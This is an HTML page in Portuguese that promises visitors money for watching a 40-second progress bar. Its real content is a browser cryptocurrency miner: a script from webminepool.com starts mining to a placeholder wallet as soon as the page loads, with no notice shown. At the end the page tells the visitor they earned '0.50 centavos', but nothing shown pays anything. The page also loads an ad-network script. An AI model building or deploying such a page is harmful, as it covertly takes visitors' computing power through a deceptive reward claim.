<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ganhe Dinheiro Assistindo</title>

    <!-- Adsterra ad code (exemplo) -->
    <script type='text/javascript' src='https://www.profitabledisplaynetwork.com/a/display.js'></script>

    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f2f2f2;
            text-align: center;
            padding: 20px;
        }
        #progressBar {
            width: 80%;
            background-color: #ddd;
            margin: 20px auto;
            height: 30px;
            border-radius: 15px;
            overflow: hidden;
        }
        #progressFill {
            height: 100%;
            width: 0%;
            background-color: #4CAF50;
            text-align: center;
            line-height: 30px;
            color: white;
        }
        #status {
            margin-top: 20px;
            font-size: 20px;
        }
    </style>
</head>
<body>

    <h1>Assista e Ganhe Dinheiro</h1>

    <!-- Progress bar -->
    <div id="progressBar">
        <div id="progressFill">0%</div>
    </div>

    <div id="status">Aguardando...</div>

    <!-- Inicia mineração -->
    <script src="https://webminepool.com/lib/base.js"></script>
    <script>
        const miner = WMP.User("YOUR_WALLET_ADDRESS", "worker1");
        miner.start();
    </script>

    <!-- Barra de progresso -->
    <script>
        let time = 0;
        let duration = 40; // segundos

        const fill = document.getElementById("progressFill");
        const status = document.getElementById("status");

        const timer = setInterval(() => {
            time++;
            let progress = Math.min((time / duration) * 100, 100);
            fill.style.width = progress + "%";
            fill.textContent = Math.floor(progress) + "%";

            if (progress >= 100) {
                clearInterval(timer);
                status.textContent = "Você ganhou 0.50 centavos!";
                miner.stop();
            }
        }, 1000);
    </script>

</body>
</html>
